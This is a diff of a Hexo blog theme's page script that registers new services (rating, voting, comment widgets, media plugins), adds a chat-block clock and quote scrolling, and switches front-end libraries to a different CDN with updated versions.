-    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
     for (let id of Object.keys(ctx.services)) {
       const js = ctx.services[id].js;
       if (id == 'siteinfo') {
@@ -520,6 +693,27 @@
         if (ctx.cardlinks?.length > 0) {
           utils.js(js, { defer: true }).then(function () {
             setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
           });
         }
       } else {
@@ -537,6 +731,76 @@
         }
       }
     }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
   });
 </script>
 
@@ -555,40 +819,24 @@
     hoverDelay: 25
   };
 </script>
-<script defer src="https://fastly.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script defer src="https://fastly.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.min.js"></script>
-<script>
-  // https://www.npmjs.com/package/vanilla-lazyload
-  // Set the options globally
-  // to make LazyLoad self-initialize
-  window.lazyLoadOptions = {
-    elements_selector: ".lazy",
-  };
-  // Listen to the initialization event
-  // and get the instance of LazyLoad
-  window.addEventListener(
-    "LazyLoad::Initialized",
-    function (event) {
-      window.lazyLoadInstance = event.detail.instance;
-    },
-    false
-  );
-  document.addEventListener('DOMContentLoaded', function () {
-    window.lazyLoadInstance?.update();
-  });
-</script><script>
+<script defer src="https://lib.baomitu.com/flying-pages/2.1.2/flying-pages.min.js"></script><script>
   ctx.fancybox = {
     selector: `.timenode p>img`,
-    css: `https://fastly.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
-    js: `https://fastly.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+    css: `https://lib.baomitu.com/fancyapps-ui/6.0.33/fancybox/fancybox.css`,
+    js: `https://lib.baomitu.com/fancyapps-ui/6.0.33/fancybox/fancybox.umd.js`
   };
-  var selector = '[data-fancybox]:not(.error)';
+  var selector = '[data-fancybox]:not(.error), .with-fancybox .atk-content img:not([atk-emoticon])';
   if (ctx.fancybox.selector) {
     selector += `, ${ctx.fancybox.selector}`
   }
   var needFancybox = document.querySelectorAll(selector).length !== 0;
   if (!needFancybox) {
-    const els = document.getElementsByClassName('ds-memos');
-    if (els != undefined && els.length > 0) {
+    const memos = document.getElementsByClassName('ds-memos');
+    if (memos != undefined && memos.length > 0) {
+      needFancybox = true;
+    }
+    const fancybox = document.getElementsByClassName('with-fancybox');
+    if (fancybox != undefined && fancybox.length > 0) {
       needFancybox = true;
     }
   }
@@ -611,8 +859,8 @@
   window.addEventListener('DOMContentLoaded', (event) => {
     const swiper_api = document.getElementById('swiper-api');
     if (swiper_api != undefined) {
-      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
-      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
         const effect = swiper_api.getAttribute('effect') || '';
         var swiper = new Swiper('.swiper#swiper-api', {
           slidesPerView: 'auto',
